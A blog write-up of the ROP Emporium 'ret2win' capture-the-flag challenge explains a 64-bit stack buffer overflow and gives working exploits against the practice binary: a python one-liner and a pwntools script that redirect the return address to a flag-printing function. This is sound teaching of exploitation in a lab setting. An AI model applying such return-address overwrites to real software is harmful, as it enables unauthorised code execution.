---
layout: single
title: "RopEmporium - Ret2win"
---

I recently came across Rop Emporium and I thought I'd give it a go and post my progress! Let's jump in...

All the challenges are hosted on the website [here](https://ropemporium.com/), there is also a guide with plenty of useful information, tools and techniques that can be used during the challenges.

# ret2win

The description for ret2win starts with "ret2win means 'return here to win'" - sounds simple, right?

Running the binary it mentions trying to fit 56 bytes into 32 bytes of stack buffer, what's the problem with this? We know that the stack grows down from higher addresses to lower addresses, and when a function prolog occurs, space is reserved on the stack for local variables, in this case only 32 bytes.

![alt text](https://ben0.github.io/assets/images/ret2win-intro.PNG "Running the binary ret2win")

Let's try with 48 characters...

![alt text](https://ben0.github.io/assets/images/ret2win-overflow.PNG "Overflowing the buffer")

We overflowed the buffer and caused the binary to segfault. Why? The call to read() accepts upto 56 bytes, which is 24 more than the 32 bytes of variable space allocated. Our input is accepted pushing the data onto the stack, the 'pwnme' function wraps up, then the return instruction then pops the next 8 bytes off the stack which is 'AAAAAAAA', because this isn't a valid memory address, it segfaults.

When the read() function stores the data on the stack, it begins at the lowest address and works up to the highest address, and if the input data exceeds the space allocated to the variable, then any data on the stack such as saved registers, or return pointers will be overwritten...

Before we move on it's handy to enumerate the binary, we'll use `NM` to understand the symbols or functions within the binary, and `Rabin2` to see what mitigations are enabled.

![alt text](https://ben0.github.io/assets/images/ret2win-nm.PNG "Symbols within the binary")

![alt text](https://ben0.github.io/assets/images/ret2win-rabin2.PNG "Mitigations")

Within the binary there are a few functions, including one called `ret2win` at address `0x0000000000400756`. This function contains a `mov edi,0x400943` instruction, then a `call 400560 <system@plt>`, lets see what string is being moved into the EDI register from address `0x400983` - Rabin2 is great for analysing strings in binaries.

![alt text](https://ben0.github.io/assets/images/ret2win-objdump-ret2win.PNG "Ret2win function disassembled")

![alt text](https://ben0.github.io/assets/images/ret2win-rabin2-strings.PNG "Strings within the binary")

Our objective is to overwrite the return address from pwnme to jump to the symbol `ret2win` rather than jumping back to `main`, then ret2win will execute the command `/bin/cat flag.txt`.

## Exploit

Using GDB it's easy to debug the binary, and experiment with different payloads to understand what's happening.

What we know:

- It's 64bit
- The buffer is 32 bytes and `read()` accepts 56 bytes, meaning a stack overflow can occur
- ASLR is disabled (PIC), the adddresses of our symbols will be the same every time the binary is run

Fire up GDB with the binary, set a breakpoint on the address of pwnme with `break *pwnme`, and run the binary with the command `run < <(python -c "print 'A' * 32 + 'B' * 8 + 'C' * 8")`, then step through a few instructions and we're at the `ret` instruction the which will pop the next address off the stack and try and jump to it.

In the screenshot we can the top of the stacking is pointing `CCCCCCCC` or `0x4343434343434343`, this will be popped off the stack into RIP and executed, though this time it'll segfault. But we know that whatever is in those 41-48 bytes will end up in the instruction register.

![alt text](https://ben0.github.io/assets/images/ret2win-gdb-pwnme.PNG "Pwnme function - GDB")

### Method 1 - Python

`python -c "print 'A' * 32 + 'B' * 8 + '\x00\x00\x00\x00\x00\x40\x07\x56'[::-1]" | ./ret2win`

![alt text](https://ben0.github.io/assets/images/ret2win-method1.PNG "Using Python to win")

### Method 2- Pwntools

```
from pwn import *

context.arch = 'amd64'

elf = ELF("ret2win")

pwnme_symbol = p64(elf.symbols["ret2win"])

payload = b"a" * 40
payload += pwnme_symbol

io = elf.process()
io.sendline(payload)
data = io.recvall()
print(data)
```

![alt text](https://ben0.github.io/assets/images/ret2win-method1.PNG "Using Pwntools to win")
